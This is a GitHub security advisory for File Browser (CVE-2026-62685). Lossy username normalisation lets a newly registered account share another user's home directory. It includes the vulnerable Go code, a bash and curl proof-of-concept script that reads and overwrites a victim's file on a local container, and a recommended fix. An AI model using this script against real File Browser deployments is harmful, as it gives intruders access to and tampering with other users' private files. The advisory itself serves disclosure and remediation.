# [H] File Browser: Colliding username normalization gives two users the same home directory

## Summary
Severity: High
Advisory: GHSA-7rc3-g7h6-22m7
CVE: CVE-2026-62685
CWE: CWE-647, CWE-706
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-7rc3-g7h6-22m7
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.63.17

## Details
## Summary

FileBrowser confines each user to a *scope*: a home directory that acts as the boundary for everything they can read or write. When self-registration and automatic home-directory creation are both enabled (`Signup=true` and `CreateUserDir=true`), a new user's scope is built from their username after it passes through `cleanUsername()`. That function rewrites the name: it strips `..` and replaces every character outside `0-9A-Za-z@_\-.` with `-`.

The problem is that this rewrite is **many-to-one**: different usernames can produce the same result, and FileBrowser never checks whether the resulting scope is already taken. So `team/one`, `team one`, and `team-one` all collapse to the same directory name, and whoever registers second is handed the **same home directory** as the first user instead of an isolated one.

This breaks per-user isolation. An attacker can pick a username that normalizes onto a victim's directory (for example registering `alice/` or `al..ice` to land in `alice`'s home) and gain full read **and** write access to that victim's files. Because username uniqueness is enforced on the raw name, both accounts coexist normally and neither user is warned that they share storage.

## Details

**1. The home directory is built straight from the cleaned username (`settings/dir.go:30`)**

```go
// MakeUserDir, when CreateUserDir is true:
username = cleanUsername(username)
// ...
userScope = path.Join(s.UserHomeBasePath, username)   // line 30
userScope = path.Join("/", userScope)                 // line 33
```

The user's scope is `path.Join(UserHomeBasePath, cleanUsername(username))`.

**2. `cleanUsername` collapses distinct inputs to the same output (`settings/dir.go:42-52`)**

```go
func cleanUsername(s string) string {
    s = strings.Trim(s, " ")
    s = strings.ReplaceAll(s, "..", "")                       // line 45, deletes ".."
    s = invalidFilenameChars.ReplaceAllString(s, "-")         // line 48, any non [0-9A-Za-z@_.-] -> "-"
    s = dashes.ReplaceAllString(s, "-")                       // line 51, collapse repeated "-"
    return s
}
```

Because several characters all map to `-` (and `..` is simply deleted), many different usernames produce the same output: `team/one`, `team one`, `team:one`, and `team-one` all become `team-one`, and `a..b` becomes `ab`. Usernames that are unique on their own end up pointing at one shared directory name.

**3. No scope-uniqueness check exists**

Username uniqueness is enforced on the raw `username` (Storm `id`), but nothing enforces uniqueness of the derived `Scope`. `signupHandler` writes the colliding scope back to the user (`http/auth.go:198-203`) and saves the account; the second registrant simply reuses the first registrant's home directory (`MakeUserDir` calls `MkdirAll`, which is idempotent).

## PoC

Tested against `filebrowser/filebrowser:v2.63.15` with `Signup=true` and `CreateUserDir=true` (default `minimumPasswordLength` is 12).

**Attack Vector: register a colliding username and read/overwrite another user's files:**

```bash
#1. Create a dir in /tmp and start a fresh v2.63.15 container
mkdir -p /tmp/filebrowser-test/srv
docker run -d --name filebrowser-test -p 8090:80 -v /tmp/filebrowser-test/srv:/srv filebrowser/filebrowser:v2.63.15 && sleep 4
B=http://localhost:8090; PW='CollidePw12345!'

#2. Admin logs in and enables the two required non-default settings: signup=true and createUserDir=true
AP=$(docker logs filebrowser-test 2>&1 | grep -o 'password: .*' | awk '{print $2}')
AT=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' -d "{\"username\":\"admin\",\"password\":\"$AP\"}")
curl -s -H "X-Auth: $AT" $B/api/settings \
  | python3 -c "import sys,json;d=json.load(sys.stdin);d['signup']=True;d['createUserDir']=True;print(json.dumps(d))" \
  | curl -s -X PUT $B/api/settings -H "X-Auth: $AT" -H 'Content-Type: application/json' -d @-

#3. Register the victim teamone-x
curl -s -X POST $B/api/signup -H 'Content-Type: application/json' -d "{\"username\":\"teamone-x\",\"password\":\"$PW\"}"

#4. Register the attacker teamone/x (distinct raw username that cleanUsername() normalizes to the same scope teamone-x)
curl -s -X POST $B/api/signup -H 'Content-Type: application/json' -d "{\"username\":\"teamone/x\",\"password\":\"$PW\"}"

#5. Log in as both accounts (TA = victim, TB = attacker)
TA=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' -d "{\"username\":\"teamone-x\",\"password\":\"$PW\"}")
TB=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' -d "{\"username\":\"teamone/x\",\"password\":\"$PW\"}")

#6. Victim A writes a private file
curl -s -X POST "$B/api/resources/secretA.txt?override=true" -H "X-Auth: $TA" --data-binary 'A-private-CONFIDENTIAL-data' -o /dev/null

#7. Attacker B reads A's file (both resolve to the single shared home directory)
curl -s "$B/api/raw/secretA.txt" -H "X-Auth: $TB"

#8. Attacker B overwrites the file
curl -s -X POST "$B/api/resources/secretA.txt?override=true" -H "X-Auth: $TB" --data-binary 'TAMPERED-BY-B' -o /dev/null

#9. Victim A reads back the tampered content
curl -s "$B/api/raw/secretA.txt" -H "X-Auth: $TA"
```

Expected output (reproduced on a fresh `filebrowser-test` container, v2.63.15):

```http
GET  /api/raw/secretA.txt   (as user B, attacker)  -> 200
A-private-CONFIDENTIAL-data

POST /api/resources/secretA.txt?override=true  (as user B)  -> 200   (empty body)

GET  /api/raw/secretA.txt   (as user A, victim, reads back)  -> 200
TAMPERED-BY-B

GET  /api/users   (as admin, both accounts share one scope)  -> 200
[ ... {"username":"teamone-x","scope":"/users/teamone-x"}, {"username":"teamone/x","scope":"/users/teamone-x"} ... ]
```

On disk there is a single shared home directory `/srv/users/teamone-x`.

## Impact

- **Cross-user read:** an attacker registering a colliding username can read every file in a victim's home directory.
- **Cross-user write and tamper:** the attacker can overwrite, rename, or delete the victim's files; the victim transparently sees the tampered content.
- **Per-user isolation bypass:** the home-directory scoping that is supposed to confine each self-registered user is defeated whenever two usernames normalize to the same value.
- **Targeted or opportunistic:** an attacker can deliberately craft a username that collides with a known victim (e.g. registering `alice/`, `alice.`, or `al..ice` to land on `alice`'s directory), or collisions can occur accidentally between legitimate users.
- **Precondition:** requires the administrator to have enabled both `Signup` and `CreateUserDir`.

## Recommended Fix

Make the derived scope canonical and enforce its uniqueness. Either reject a signup whose normalized scope already exists, or bind the home directory to the immutable user ID rather than to a normalized username:

```go
// settings/dir.go, base the home dir on a collision-free identifier:
userScope = path.Join(s.UserHomeBasePath, strconv.FormatUint(uint64(user.ID), 10))
```

Alternatively, in `signupHandler`, after computing the scope, reject the registration if any existing user already owns that scope (`store.Users.GetByScope(scope)` ⇒ 409 Conflict). Also reject usernames whose normalized form differs from the raw username, so that `cleanUsername` is never silently lossy.

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-7rc3-g7h6-22m7
- https://nvd.nist.gov/vuln/detail/CVE-2026-62685
- https://github.com/filebrowser/filebrowser/commit/883a36f02fcb69566a8628cb47f18fdc73348387
- https://github.com/filebrowser/filebrowser
- https://github.com/filebrowser/filebrowser/releases/tag/v2.63.17
